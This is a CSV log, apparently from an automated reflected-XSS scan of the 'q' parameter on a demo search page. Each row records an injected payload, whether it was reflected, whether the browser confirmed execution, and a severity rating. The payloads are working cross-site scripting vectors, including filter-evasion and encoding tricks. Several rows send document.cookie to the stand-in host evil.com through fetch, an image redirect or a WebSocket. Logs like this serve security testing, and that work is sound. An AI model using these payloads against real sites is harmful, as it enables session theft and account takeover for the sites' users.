Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:01:07.420,2026-01-10 17:01:07.536,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.422,2026-01-10 17:01:07.536,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.420,2026-01-10 17:01:07.540,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:06.663,2026-01-10 17:01:07.551,0.888,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:07.536,2026-01-10 17:01:07.653,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:06.806,2026-01-10 17:01:07.653,0.846,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:07.536,2026-01-10 17:01:07.653,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.533,2026-01-10 17:01:07.657,0.124,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.529,2026-01-10 17:01:07.661,0.132,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.529,2026-01-10 17:01:07.663,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.551,2026-01-10 17:01:07.665,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:06.809,2026-01-10 17:01:07.715,0.906,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:07.653,2026-01-10 17:01:07.781,0.128,https://demo-knsl.onrender.com/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.653,2026-01-10 17:01:07.781,0.129,https://demo-knsl.onrender.com/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.665,2026-01-10 17:01:07.805,0.141,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.657,2026-01-10 17:01:07.806,0.149,https://demo-knsl.onrender.com/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.663,2026-01-10 17:01:07.809,0.147,https://demo-knsl.onrender.com/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.661,2026-01-10 17:01:07.810,0.148,https://demo-knsl.onrender.com/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.715,2026-01-10 17:01:07.828,0.114,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.781,2026-01-10 17:01:07.890,0.109,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.781,2026-01-10 17:01:07.903,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.809,2026-01-10 17:01:07.924,0.114,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.805,2026-01-10 17:01:07.924,0.118,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.806,2026-01-10 17:01:07.927,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.810,2026-01-10 17:01:07.935,0.125,https://demo-knsl.onrender.com/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.828,2026-01-10 17:01:07.938,0.110,https://demo-knsl.onrender.com/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.890,2026-01-10 17:01:08.011,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.903,2026-01-10 17:01:08.019,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.924,2026-01-10 17:01:08.039,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.927,2026-01-10 17:01:08.039,0.112,https://demo-knsl.onrender.com/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.924,2026-01-10 17:01:08.042,0.119,https://demo-knsl.onrender.com/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.935,2026-01-10 17:01:08.043,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.938,2026-01-10 17:01:08.046,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.011,2026-01-10 17:01:08.122,0.111,https://demo-knsl.onrender.com/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.019,2026-01-10 17:01:08.122,0.103,https://demo-knsl.onrender.com/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.043,2026-01-10 17:01:08.161,0.118,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.039,2026-01-10 17:01:08.161,0.122,https://demo-knsl.onrender.com/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.039,2026-01-10 17:01:08.164,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.046,2026-01-10 17:01:08.164,0.118,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.042,2026-01-10 17:01:08.168,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.122,2026-01-10 17:01:08.241,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.122,2026-01-10 17:01:08.241,0.118,https://demo-knsl.onrender.com/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.161,2026-01-10 17:01:08.283,0.122,https://demo-knsl.onrender.com/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.161,2026-01-10 17:01:08.284,0.123,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.164,2026-01-10 17:01:08.286,0.122,https://demo-knsl.onrender.com/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.164,2026-01-10 17:01:08.287,0.123,https://demo-knsl.onrender.com/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.168,2026-01-10 17:01:08.289,0.121,https://demo-knsl.onrender.com/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.241,2026-01-10 17:01:08.379,0.139,https://demo-knsl.onrender.com/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.241,2026-01-10 17:01:08.379,0.139,https://demo-knsl.onrender.com/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.532,2026-01-10 17:01:08.397,0.865,https://demo-knsl.onrender.com/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:07.540,2026-01-10 17:01:08.433,0.894,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:08.289,2026-01-10 17:01:08.453,0.164,https://demo-knsl.onrender.com/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.287,2026-01-10 17:01:08.454,0.167,https://demo-knsl.onrender.com/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.283,2026-01-10 17:01:08.457,0.174,https://demo-knsl.onrender.com/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.379,2026-01-10 17:01:08.504,0.125,https://demo-knsl.onrender.com/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.379,2026-01-10 17:01:08.504,0.125,https://demo-knsl.onrender.com/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.397,2026-01-10 17:01:08.506,0.109,https://demo-knsl.onrender.com/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:07.653,2026-01-10 17:01:08.529,0.876,https://demo-knsl.onrender.com/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:01:08.433,2026-01-10 17:01:08.588,0.154,https://demo-knsl.onrender.com/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.454,2026-01-10 17:01:08.588,0.135,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.457,2026-01-10 17:01:08.592,0.135,https://demo-knsl.onrender.com/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.286,2026-01-10 17:01:08.600,0.314,https://demo-knsl.onrender.com/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.506,2026-01-10 17:01:08.612,0.106,https://demo-knsl.onrender.com/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.504,2026-01-10 17:01:08.612,0.109,https://demo-knsl.onrender.com/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.504,2026-01-10 17:01:08.622,0.118,https://demo-knsl.onrender.com/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.529,2026-01-10 17:01:08.638,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.588,2026-01-10 17:01:08.689,0.101,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.600,2026-01-10 17:01:08.703,0.103,https://demo-knsl.onrender.com/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.284,2026-01-10 17:01:08.706,0.422,https://demo-knsl.onrender.com/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.588,2026-01-10 17:01:08.706,0.118,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.612,2026-01-10 17:01:08.720,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.622,2026-01-10 17:01:08.732,0.110,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.612,2026-01-10 17:01:08.732,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.638,2026-01-10 17:01:08.769,0.131,https://demo-knsl.onrender.com/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.703,2026-01-10 17:01:08.807,0.104,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.706,2026-01-10 17:01:08.807,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.592,2026-01-10 17:01:08.813,0.221,https://demo-knsl.onrender.com/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.706,2026-01-10 17:01:08.826,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.720,2026-01-10 17:01:08.838,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.732,2026-01-10 17:01:08.840,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.732,2026-01-10 17:01:08.841,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.769,2026-01-10 17:01:08.865,0.096,https://demo-knsl.onrender.com/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.453,2026-01-10 17:01:08.895,0.442,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.807,2026-01-10 17:01:08.930,0.122,https://demo-knsl.onrender.com/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.808,2026-01-10 17:01:08.930,0.123,https://demo-knsl.onrender.com/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.826,2026-01-10 17:01:08.935,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.841,2026-01-10 17:01:08.954,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.838,2026-01-10 17:01:08.954,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.865,2026-01-10 17:01:08.974,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.895,2026-01-10 17:01:09.010,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.930,2026-01-10 17:01:09.034,0.104,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.930,2026-01-10 17:01:09.037,0.107,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.935,2026-01-10 17:01:09.037,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.813,2026-01-10 17:01:09.045,0.232,https://demo-knsl.onrender.com/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.954,2026-01-10 17:01:09.146,0.192,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.954,2026-01-10 17:01:09.146,0.193,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.689,2026-01-10 17:01:09.147,0.458,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.974,2026-01-10 17:01:09.147,0.173,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:08.840,2026-01-10 17:01:09.161,0.320,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.034,2026-01-10 17:01:09.201,0.167,https://demo-knsl.onrender.com/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.010,2026-01-10 17:01:09.201,0.192,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.037,2026-01-10 17:01:09.201,0.164,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.045,2026-01-10 17:01:09.218,0.173,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.147,2026-01-10 17:01:09.267,0.120,https://demo-knsl.onrender.com/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.146,2026-01-10 17:01:09.303,0.157,https://demo-knsl.onrender.com/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.201,2026-01-10 17:01:09.311,0.110,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-10 17:01:09.161,2026-01-10 17:01:09.313,0.152,https://demo-knsl.onrender.com/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.201,2026-01-10 17:01:09.328,0.127,https://demo-knsl.onrender.com/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.201,2026-01-10 17:01:09.333,0.131,https://demo-knsl.onrender.com/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.218,2026-01-10 17:01:09.344,0.127,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.303,2026-01-10 17:01:09.388,0.085,https://demo-knsl.onrender.com/search,GET,q,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:01:09.267,2026-01-10 17:01:09.397,0.130,https://demo-knsl.onrender.com/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.328,2026-01-10 17:01:09.398,0.070,https://demo-knsl.onrender.com/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
2026-01-10 17:01:09.313,2026-01-10 17:01:09.420,0.107,https://demo-knsl.onrender.com/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.311,2026-01-10 17:01:09.422,0.111,https://demo-knsl.onrender.com/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.147,2026-01-10 17:01:09.440,0.293,https://demo-knsl.onrender.com/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.333,2026-01-10 17:01:09.441,0.108,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.344,2026-01-10 17:01:09.442,0.098,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.398,2026-01-10 17:01:09.526,0.127,https://demo-knsl.onrender.com/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.388,2026-01-10 17:01:09.526,0.138,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.420,2026-01-10 17:01:09.530,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.422,2026-01-10 17:01:09.534,0.112,https://demo-knsl.onrender.com/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.440,2026-01-10 17:01:09.582,0.142,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.441,2026-01-10 17:01:09.583,0.142,https://demo-knsl.onrender.com/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.442,2026-01-10 17:01:09.586,0.143,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.534,2026-01-10 17:01:09.668,0.134,https://demo-knsl.onrender.com/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.530,2026-01-10 17:01:09.668,0.138,https://demo-knsl.onrender.com/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.526,2026-01-10 17:01:09.671,0.146,https://demo-knsl.onrender.com/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.526,2026-01-10 17:01:09.671,0.146,https://demo-knsl.onrender.com/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.582,2026-01-10 17:01:09.697,0.115,https://demo-knsl.onrender.com/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.583,2026-01-10 17:01:09.697,0.114,https://demo-knsl.onrender.com/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.586,2026-01-10 17:01:09.707,0.121,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.671,2026-01-10 17:01:09.776,0.104,https://demo-knsl.onrender.com/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.668,2026-01-10 17:01:09.776,0.108,https://demo-knsl.onrender.com/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.671,2026-01-10 17:01:09.782,0.111,https://demo-knsl.onrender.com/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.668,2026-01-10 17:01:09.784,0.116,https://demo-knsl.onrender.com/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.037,2026-01-10 17:01:09.869,0.833,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:01:09.697,2026-01-10 17:01:09.893,0.196,https://demo-knsl.onrender.com/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.697,2026-01-10 17:01:09.893,0.196,https://demo-knsl.onrender.com/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.776,2026-01-10 17:01:09.904,0.128,https://demo-knsl.onrender.com/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.784,2026-01-10 17:01:09.904,0.121,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.782,2026-01-10 17:01:09.907,0.125,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:01:09.776,2026-01-10 17:01:09.929,0.153,https://demo-knsl.onrender.com/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
